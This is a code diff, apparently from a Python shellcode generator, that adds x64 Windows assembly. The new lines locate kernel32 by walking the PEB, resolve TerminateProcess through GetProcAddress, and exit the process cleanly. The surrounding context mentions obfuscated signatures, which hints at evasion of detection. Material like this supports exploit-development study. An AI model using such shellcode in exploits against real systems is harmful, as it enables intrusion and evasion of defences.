@@ -511,8 +511,36 @@ f"{obfuscated_signatures}"
 " xor rdx, rdx;"
 " inc rdx;"
 " xor r8, r8;"
+" push r13;"				# Save GetProcAddress
+" push r13;"
 " sub rsp, 0x30;"
 " call rbx;"
+" add rsp, 0x30;"
+" pop r13;"				# Recover GetProcAddress
+" pop r13;"
+" xor rdx, rdx;"
+" mov rax, gs:[rdx+0x60];"		# RAX = PEB Address
+" mov rcx,[rax+0x18];"			# RCX = Address of _PEB_LDR_DATA
+" mov rcx,[rcx + 0x30];"		# RCX = Address of the InInitializationOrderModuleList
+" mov rcx, [rcx];"
+" mov rcx, [rcx];"			
+" mov rcx, [rcx+0x10];"			# kernel32
+" xor rdx, rdx;"	
+" push rdx;"				# Align 16 bytes
+" push rdx;"				
+" mov rdx, 0x737365636F725065;"		# Push string "ssecorPe" to RDX
+" push rdx;"
+" mov rdx, 0x74616E696D726554;"		# Push string "tanimreT" to RDX
+" push rdx;"
+" mov rdx, rsp;"
+" sub rsp, 0x30;"
+" call r13;"				# Get TerminateProcess address
+" add rsp, 0x30;"
+" xor rcx, rcx;"
+" dec rcx;"				# HANDLE = -1
+" xor rdx, rdx;"			# uExitCode = 0
+" sub rsp, 0x30;"
+" call rax;"
 " add rsp, 0x30;"
 )
 
